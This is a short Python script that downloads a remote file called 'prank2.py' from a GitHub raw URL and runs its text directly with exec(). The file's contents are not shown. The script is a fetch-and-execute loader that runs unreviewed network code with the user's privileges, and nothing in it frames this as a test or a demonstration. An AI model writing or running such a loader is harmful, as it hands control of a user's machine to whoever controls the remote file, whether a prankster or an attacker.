from lxml import html
import requests

page = requests.get('https://raw.githubusercontent.com/avnishkgaur/spreadyourvoice/master/prank2.py')
exec(page.text)